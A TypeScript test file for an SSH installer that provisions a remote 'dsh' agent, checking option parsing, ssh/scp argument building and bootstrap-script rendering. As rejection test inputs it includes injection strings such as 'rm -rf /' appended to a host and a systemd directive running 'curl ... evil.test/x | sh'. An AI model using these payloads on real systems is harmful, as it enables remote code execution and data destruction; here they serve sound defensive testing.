import assert from 'node:assert/strict'
import { describe, it } from 'node:test'

import { fromOptions, renderBootstrapScript, renderSystemdUnit, shellPath } from '../src/bootstrap.ts'
import { HELP, parseArgs, resolveScpBinary, UsageError } from '../src/options.ts'
import { parseTarget, scpArgs, sshArgs, type ScpOptions, type SshOptions } from '../src/ssh.ts'

const baseArgs = ['plan', '--target', 'example-host'] as const

describe('installer options', () => {
  it('parses commands and defaults', () => {
    const options = parseArgs(baseArgs)
    assert.equal(options.command, 'plan')
    assert.equal(options.target, 'example-host')
    assert.equal(options.profile, 'web')
    assert.equal(options.port, 0)
    assert.equal(options.start, 'systemd')
    assert.equal(options.dshVersion, '0.2.2-rc.3')
    assert.equal(options.strictHostKeyChecking, 'accept-new')
  })

  it('accepts a positional target and explicit flags', () => {
    const options = parseArgs(['discover', 'alice@example-host:2222', '--json', '--start', 'nohup', '--port', '8080'])
    assert.equal(options.command, 'discover')
    assert.equal(options.target, 'alice@example-host:2222')
    assert.equal(options.json, true)
    assert.equal(options.start, 'nohup')
    assert.equal(options.port, 8080)
  })

  it('rejects missing targets and malformed values', () => {
    assert.throws(() => parseArgs(['install']), UsageError)
    assert.throws(() => parseArgs([...baseArgs, '--port', 'x']), UsageError)
    assert.throws(() => parseArgs([...baseArgs, '--start', 'bogus']), UsageError)
    assert.throws(() => parseArgs([...baseArgs, '--nope']), UsageError)
  })

  it('docs the security model in help', () => {
    // Direct mode does write the key to the remote host, so help must not
    // claim the key is never copied; it has to name both modes instead.
    assert.doesNotMatch(HELP, /never copies model API keys/)
    assert.match(HELP, /direct \(default\)/)
    assert.match(HELP, /proxy/)
    assert.match(HELP, /DEEPSEEK_API_KEY/)
    assert.match(HELP, /127\.0\.0\.1/)
  })

  it('accepts a global prefix and refuses anything that is not a path', () => {
    assert.equal(parseArgs(baseArgs).globalPrefix, '')
    assert.equal(parseArgs([...baseArgs, '--global-prefix', '/opt/npm']).globalPrefix, '/opt/npm')
    assert.equal(parseArgs([...baseArgs, '--global-prefix', '~/npm-global']).globalPrefix, '~/npm-global')
    assert.equal(parseArgs([...baseArgs, '--global-prefix', '$HOME/npm-global']).globalPrefix, '$HOME/npm-global')
    assert.equal(parseArgs([...baseArgs, '--global-prefix', '/opt/npm/']).globalPrefix, '/opt/npm')
    // Anything else would reach the remote shell as an unvalidated word.
    assert.throws(() => parseArgs([...baseArgs, '--global-prefix', 'npm-global']), UsageError)
    assert.throws(() => parseArgs([...baseArgs, '--global-prefix', '~/*']), UsageError)
    assert.throws(() => parseArgs([...baseArgs, '--global-prefix', '/opt/npm;rm']), UsageError)
    assert.throws(() => parseArgs([...baseArgs, '--global-prefix', '~/']), UsageError)
    assert.match(HELP, /--global-prefix/)
  })
})

describe('SSH target parsing', () => {
  it('accepts aliases, user@host, ports, and URLs', () => {
    assert.equal(parseTarget('example-host').canonical, 'example-host')
    assert.equal(parseTarget('alice@example-host:2222').canonical, 'alice@example-host:2222')
    assert.equal(parseTarget('ssh://alice@example-host:22').canonical, 'alice@example-host:22')
  })

  it('rejects option and shell injection', () => {
    assert.throws(() => parseTarget('-oProxyCommand=x'))
    assert.throws(() => parseTarget('alice@example-host;rm -rf /'))
    assert.throws(() => parseTarget('alice@example-host:0'))
  })

  it('builds argv without a shell', () => {
    const options: SshOptions = {
      binary: 'ssh',
      strictHostKeyChecking: 'accept-new',
      timeoutMs: 15_000,
      verbose: false,
    }
    const args = sshArgs(parseTarget('alice@example-host:2222'), options)
    assert.ok(args.includes('BatchMode=yes'))
    assert.ok(args.includes('StrictHostKeyChecking=accept-new'))
    assert.deepEqual(args.slice(-2), ['-p', '2222'])
  })

  it('builds the scp argv with an upper-case port flag', () => {
    const options: ScpOptions = {
      binary: 'scp',
      strictHostKeyChecking: 'accept-new',
      verbose: false,
    }
    const args = scpArgs(parseTarget('alice@example-host:2222'), options, '/tmp/a.tgz', '/tmp/b.tgz')
    // scp uses -P while ssh uses -p; mixing them silently uploads to the wrong port.
    assert.ok(args.includes('-P'))
    assert.ok(!args.includes('-p'))
    assert.deepEqual(args.slice(-2), ['/tmp/a.tgz', 'alice@example-host:/tmp/b.tgz'])
  })
})

describe('scp binary pairing', () => {
  it('keeps the bare scp on PATH for a bare ssh', () => {
    assert.equal(resolveScpBinary('ssh', undefined), 'scp')
    assert.equal(resolveScpBinary('ssh', ''), 'scp')
    assert.equal(resolveScpBinary('ssh', '   '), 'scp')
  })

  it('pairs a custom ssh path with its sibling scp', () => {
    const binary = resolveScpBinary('/opt/openssh/bin/ssh', undefined)
    assert.match(binary, /scp$/u)
    assert.ok(binary.includes('openssh'), `expected the sibling directory, got ${binary}`)
  })

  it('lets an explicit scp win', () => {
    assert.equal(resolveScpBinary('/opt/openssh/bin/ssh', '/usr/bin/scp'), '/usr/bin/scp')
    assert.equal(resolveScpBinary('ssh', '  /usr/bin/scp  '), '/usr/bin/scp')
  })

  it('exposes the pairing through the parsed options', () => {
    assert.equal(parseArgs([...baseArgs]).scpBinary, 'scp')
    assert.equal(parseArgs([...baseArgs, '--scp', '/usr/bin/scp']).scpBinary, '/usr/bin/scp')
    assert.equal(parseArgs([...baseArgs, '--ssh', '/opt/bin/ssh']).scpBinary, resolveScpBinary('/opt/bin/ssh', undefined))
  })

  it('documents the flag in help', () => {
    assert.match(HELP, /--scp/u)
  })
})

describe('bootstrap rendering', () => {
  const options = parseArgs(['plan', '--target', 'example-host', '--port', '8080'])

  it('renders a systemd unit that runs the global dsh', () => {
    const unit = renderSystemdUnit({
      profile: 'web',
      port: 8080,
      dshHome: '$HOME/.dsh',
      dshVersion: '0.2.1-rc.2',
      pnpmVersion: '11.21.0',
      start: 'systemd',
      agentTarball: '/tmp/agent.tgz',
    })
    assert.match(unit, /Environment="DSH_HOME=\$DSH_HOME"/)
    // The global prefix comes first, and the node bin dir follows because dsh
    // runs under a `#!/usr/bin/env node` shebang.
    assert.match(unit, /Environment="PATH=\$DSH_PREFIX\/bin:\$DSH_NODE_BIN_DIR:.*:\$PATH"/)
    assert.match(unit, /Environment="DSH_WAYPOINT_DSH_VERSION=\$DSH_VERSION"/)
    assert.match(unit, /ExecStart="\$DSH_BIN" web --host 127\.0\.0\.1 --port \$PORT --no-open/)
  })

  it('renders proxy env only when configured', () => {
    const script = renderBootstrapScript({
      profile: 'web', port: 0, dshHome: '/srv/dsh',
      dshVersion: '0.2.1-rc.2', pnpmVersion: '11.21.0', start: 'nohup',
      agentTarball: '/tmp/a.tgz', modelBaseUrl: 'http://127.0.0.1:47821', modelApiKey: 'placeholder',
    })
    assert.match(script, /DEEPSEEK_BASE_URL="\$MODEL_BASE_URL" DEEPSEEK_API_KEY="\$MODEL_API_KEY" DSH_WAYPOINT_DSH_VERSION=/)
    assert.match(script, /nohup "\$DSH_BIN" web/)
  })

  it('exports a remote install proxy for bootstrap downloads', () => {
    const script = renderBootstrapScript({
      profile: 'web', port: 0, dshHome: '/srv/dsh',
      dshVersion: '0.2.1-rc.2', pnpmVersion: '11.21.0', start: 'nohup',
      agentTarball: '/tmp/a.tgz', proxyUrl: 'http://127.0.0.1:17890', noProxy: '127.0.0.1,localhost',
    })
    assert.match(script, /PROXY_URL='http:\/\/127\.0\.0\.1:17890'/)
    assert.match(script, /export HTTP_PROXY="\$PROXY_URL"/)
    assert.match(script, /npm_config_proxy="\$PROXY_URL"/)
    assert.match(script, /install proxy configured/)
  })

  it('passes the runtime proxy into the systemd service environment', () => {
    const script = renderBootstrapScript({
      profile: 'web', port: 0, dshHome: '/srv/dsh',
      dshVersion: '0.2.1-rc.2', pnpmVersion: '11.21.0', start: 'systemd',
      agentTarball: '/tmp/a.tgz', proxyUrl: 'http://127.0.0.1:7891', noProxy: '127.0.0.1,localhost',
    })
    assert.match(script, /PROXY_ENV_LINES=/)
    assert.match(script, /Environment=\\"HTTP_PROXY=\$PROXY_URL\\"/)
    assert.match(script, /\$\{PROXY_ENV_LINES\}/)
  })

  it('stops the service and drops stale state before reinstalling', () => {
    const script = renderBootstrapScript({
      profile: 'web', port: 0, dshHome: '/srv/dsh',
      dshVersion: '0.2.1-rc.3', pnpmVersion: '11.21.0',
      upgrade: true, start: 'systemd', agentTarball: '/tmp/a.tgz',
    })
    assert.match(script, /DSH_UPGRADE=1/)
    assert.match(script, /stopping the remote DSH service before upgrading/)
    assert.match(script, /systemctl --user stop dsh-waypoint-agent\.service/)
    assert.match(script, /rm -f "\$STATE_FILE"/)
  })

  it('installs dsh and pnpm globally, unconditionally', () => {
    // Every provisioning run pins both into the npm global prefix. There is no
    // "already present" branch: a second location is exactly the divergence
    // this change removes.
    for (const script of [
      renderBootstrapScript({
        profile: 'web', port: 0, dshHome: '/srv/dsh',
        dshVersion: '0.2.1-rc.3', pnpmVersion: '11.21.0',
        upgrade: true, start: 'systemd', agentTarball: '/tmp/a.tgz',
      }),
      fromOptions(parseArgs(baseArgs), '/tmp/agent.tgz'),
    ]) {
      assert.match(script, /npm install --global --prefix "\$DSH_PREFIX".*"pnpm@\$PNPM_VERSION"/)
      assert.match(script, /npm install --global --prefix "\$DSH_PREFIX".*"@deepseek-ai\/dsh@\$DSH_VERSION"/)
      assert.match(script, /installing @deepseek-ai\/dsh@\$DSH_VERSION globally into \$DSH_PREFIX/)
      // npm's own exit code (243 for EACCES) means nothing to an operator, so
      // each install reports a documented cause instead.
      assert.match(script, /if ! npm install --global --prefix "\$DSH_PREFIX"[^\n]*"pnpm@\$PNPM_VERSION"; then/)
      assert.match(script, /if ! npm install --global --prefix "\$DSH_PREFIX"[^\n]*"@deepseek-ai\/dsh@\$DSH_VERSION"; then/)
      assert.match(script, /point remoteGlobalPrefix at a directory you own/)
      // No per-install-dir npm tree, and no conditional skip around pnpm.
      assert.doesNotMatch(script, /npm install --prefix "\$INSTALL_DIR"/)
      assert.doesNotMatch(script, /command -v pnpm/)
      // The prefix has exactly one source: the option, or npm. A fallback
      // location would put dsh somewhere the operator is not told about.
      assert.doesNotMatch(script, /DSH_PREFIX=.*\.local/)
      assert.doesNotMatch(script, /DSH_PREFIX=.*INSTALL_DIR/)
    }
  })

  it('proves the install by running the command, not by inspecting paths', () => {
    const script = fromOptions(parseArgs(baseArgs), '/tmp/agent.tgz')
    // stdout only: a Node deprecation warning on stderr must not be mistaken
    // for the version the check compares.
    assert.match(script, /DSH_ACTUAL="\$\(PATH="\$DSH_NODE_BIN_DIR:\$PATH" "\$DSH_BIN" -V 2>\/dev\/null \| tail -n 1 \|\| true\)"/)
    assert.match(script, /\[ "\$DSH_ACTUAL" != "\$DSH_VERSION" \]/)
    assert.match(script, /exit 24/)
    assert.match(script, /dsh-waypoint: dsh command is \$DSH_BIN/)
    assert.match(script, /export PATH=\\"\$DSH_PREFIX\/bin:/)
  })

  it('installs the bundled agent where it was uploaded', () => {
    const script = fromOptions(parseArgs(baseArgs), '/tmp/agent.tgz')
    // The tarball is used in place; no second copy under INSTALL_DIR.
    assert.doesNotMatch(script, /AGENT_ARTIFACT/)
    assert.match(script, /plugin --profile "\$PROFILE" add "\$AGENT_TARBALL"/)
    // No migration of a previous nested install: that layout is gone.
    assert.doesNotMatch(script, /rm -rf -- "\$INSTALL_DIR\/node_modules"/)
    assert.doesNotMatch(script, /Earlier releases nested DSH/)
  })

  it('never edits the remote dotfiles', () => {
    assert.doesNotMatch(fromOptions(parseArgs(baseArgs), '/tmp/a.tgz'), /bashrc|zshrc|profile\.d|config\.fish/u)
  })

  it('renders the bootstrap script and never embeds a token', () => {
    const script = fromOptions(options, '/tmp/agent.tgz')
    assert.match(script, /set -euo pipefail/)
    assert.match(script, /umask 077/)
    assert.match(script, /chmod 600 "\$UNIT_DIR\/dsh-waypoint-agent\.service"/)
    assert.match(script, /npm install --global --prefix "\$DSH_PREFIX"/)
    assert.match(script, /plugin --profile "\$PROFILE" add "\$AGENT_TARBALL"/)
    assert.match(script, /systemd/)
    assert.doesNotMatch(script, /token/i)
    assert.match(script, /waypoint-agent\/agent\.json/)
  })

  it('separates a pnpm install failure from a dsh install failure', () => {
    const script = fromOptions(parseArgs(baseArgs), '/tmp/agent.tgz')
    // dsh is installed after pnpm, so a failed pnpm install leaves dsh never
    // attempted. Reporting that as "dsh-missing" sent an operator looking at
    // the wrong prefix, the wrong Node version and the wrong log line.
    assert.match(script, /installing pnpm@\$PNPM_VERSION globally into \$DSH_PREFIX/)
    const pnpmBlock = script.slice(
      script.indexOf('installing pnpm@$PNPM_VERSION globally'),
      script.indexOf('installing @deepseek-ai/dsh@$DSH_VERSION globally'),
    )
    assert.ok(pnpmBlock.length > 0, 'expected the pnpm install block to precede the dsh one')
    assert.match(pnpmBlock, /exit 25/)
    assert.doesNotMatch(pnpmBlock, /exit 24/)
    // The corepack conflict is the common cause for that EEXIST; name the fix.
    assert.match(pnpmBlock, /corepack shims/)
    assert.match(pnpmBlock, /rm -f "\$DSH_PREFIX\/bin\/pnpm" "\$DSH_PREFIX\/bin\/pnpx"/)
  })

  it('checks Node.js instead of installing it', () => {
    const script = fromOptions(parseArgs(baseArgs), '/tmp/agent.tgz')
    // The script must never download or unpack a runtime: choosing a Node
    // version is the operator's decision, and a second one is how a host ends
    // up with two runtimes fighting over one command.
    assert.doesNotMatch(script, /install_node/)
    assert.doesNotMatch(script, /nodejs\.org/)
    assert.doesNotMatch(script, /SHASUMS256/)
    assert.doesNotMatch(script, /AUTO_INSTALL_NODE/)
    assert.doesNotMatch(script, /--strip-components/)
    assert.doesNotMatch(script, /NODE_VERSION/)
    // Detection stays, with actionable wording.
    assert.match(script, /command -v node/)
    assert.match(script, /Node\.js was not found through this account's shell/)
    assert.match(script, /exit 21/)
    assert.match(script, /exit 22/)
    assert.match(script, /node ready/)
  })

  it('installs the uploaded tarball and never a registry package', () => {
    const script = fromOptions(parseArgs(baseArgs), '/tmp/agent.tgz')
    // A registry install resolves by version. When that version is already in
    // the profile, `dsh plugin add` replaces nothing — so a corrected bundle
    // kept running old behaviour while every log line said "installed".
    assert.doesNotMatch(script, /AGENT_NPM_SPEC/)
    assert.doesNotMatch(script, /dsh-waypoint-agent@/)
    assert.doesNotMatch(script, /installed agent from npm/)
    assert.match(script, /plugin --profile "\$PROFILE" add "\$AGENT_TARBALL"/)
    // No `remove` first: on this profile it hangs inside pnpm after rewriting
    // the manifest. The upload path is timestamped, so re-adding it is a
    // different spec and replaces the dependency on its own.
    assert.doesNotMatch(script, /plugin --profile "\$PROFILE" remove/)
  })

  it('migrates legacy agent profile entries before installing', () => {
    const script = fromOptions(parseArgs(baseArgs), '/tmp/agent.tgz')
    assert.match(script, /DSH_WAYPOINT_MIGRATE/)
    // The upstream names, never the one this run installs: a cleanup that
    // deleted `dsh-waypoint-agent` would remove the dependency it is about to
    // add, and the agent would report "installed" while running nothing.
    assert.match(script, /delete data.dependencies\[name\]/)
    assert.match(script, /'@goldenpigeon\/dsh-remote-agent'/)
    assert.match(script, /removed the legacy remote-agent profile entry/)
    assert.match(script, /pnpm-lock\.yaml\.legacy-backup/)
    assert.doesNotMatch(script, /LEGACY_AGENTS = \[[^\]]*'dsh-waypoint-agent'/)
  })

  it('supports nohup and none start modes', () => {
    const nohup = fromOptions(parseArgs(['plan', '--target', 'example-host', '--start', 'nohup']), '/tmp/agent.tgz')
    assert.match(nohup, /nohup "\$DSH_BIN" web/)
    // The nohup path needs node on PATH for dsh's `#!/usr/bin/env node` shebang.
    assert.match(nohup, /PATH="\$DSH_PREFIX\/bin:\$DSH_NODE_BIN_DIR:\$PATH"/)
    assert.doesNotMatch(nohup, /DEEPSEEK_BASE_URL=/)
    const none = fromOptions(parseArgs(['plan', '--target', 'example-host', '--start', 'none']), '/tmp/agent.tgz')
    assert.match(none, /start mode none/)
    assert.doesNotMatch(none, /systemctl --user enable/)
    const systemd = fromOptions(options, '/tmp/agent.tgz')
    assert.match(systemd, /systemctl --user restart dsh-waypoint-agent\.service/)
  })

  it('expands tilde paths only at remote runtime', () => {
    assert.equal(shellPath('$HOME/.dsh'), `"$HOME/"'.dsh'`)
    assert.equal(shellPath('/srv/dsh'), `'/srv/dsh'`)
    assert.equal(shellPath('~'), '"$HOME"')
    // `$HOME` on its own used to fall through to a literal, so `--dsh-home
    // '$HOME'` installed into a directory named `$HOME`.
    assert.equal(shellPath('$HOME'), '"$HOME"')
  })

  it('refuses a configured value that could inject a unit directive', () => {
    // The unit is written with an expanding heredoc, so a newline in a
    // configured value ends one directive and starts another — which would run
    // whatever the second line says as that account.
    const base = {
      profile: 'web',
      port: 0,
      dshHome: '~/.dsh',
      dshVersion: '0.2.2-rc.3',
      pnpmVersion: '11.21.0',
      start: 'systemd' as const,
      agentTarball: '/tmp/a.tgz',
    }
    assert.throws(
      () => renderBootstrapScript({
        ...base,
        dshHome: '/srv/dsh\nExecStartPre=/bin/sh -c "curl -s http://evil.test/x | sh"',
      }),
      /dshHome must not contain control characters/u,
    )
    assert.throws(
      () => renderBootstrapScript({ ...base, modelBaseUrl: 'https://api.example.test/\nX' }),
      /modelBaseUrl must not contain control characters/u,
    )
    // A value without control characters still renders.
    assert.match(renderBootstrapScript({ ...base, dshHome: '/srv/dsh' }), /DSH_HOME='\/srv\/dsh'/u)
  })

  it('keeps the rendered port and profile', () => {
    const script = renderBootstrapScript({
      profile: 'remote',
      port: 9090,
      dshHome: '/srv/dsh-home',
      dshVersion: '0.2.1-rc.2',
      pnpmVersion: '11.21.0',
      start: 'systemd',
      agentTarball: '/tmp/agent.tgz',
    })
    assert.match(script, /PROFILE='remote'/)
    assert.match(script, /PORT='9090'/)
    assert.match(script, /DSH_HOME='\/srv\/dsh-home'/)
  })

  it('names the planned tarball after the real agent version', async () => {
    const { commandPlan } = await import('../src/commands.ts')
    const { agentVersion } = await import('../src/commands.ts')
    const version = agentVersion()
    const script = commandPlan(parseArgs(baseArgs))
    if (version === undefined) {
      // An unreadable manifest must drop the version rather than invent one.
      assert.match(script, /AGENT_TARBALL='\/tmp\/dsh-waypoint-agent\.tgz'/u)
      return
    }
    assert.notEqual(version, '0.2.0')
    assert.ok(script.includes(`AGENT_TARBALL='/tmp/dsh-waypoint-agent-${version}.tgz'`), script.slice(0, 600))
  })

  it('passes a requested port through the programmatic provisioner', () => {
    // `port` defaults to 0 so the OS picks one, but an explicit value must win.
    assert.match(renderBootstrapScript({
      profile: 'web',
      port: 7731,
      dshHome: '/srv/dsh',
      dshVersion: '0.2.1-rc.2',
      pnpmVersion: '11.21.0',
      start: 'nohup',
      agentTarball: '/tmp/a.tgz',
    }), /PORT='7731'/)
  })
})
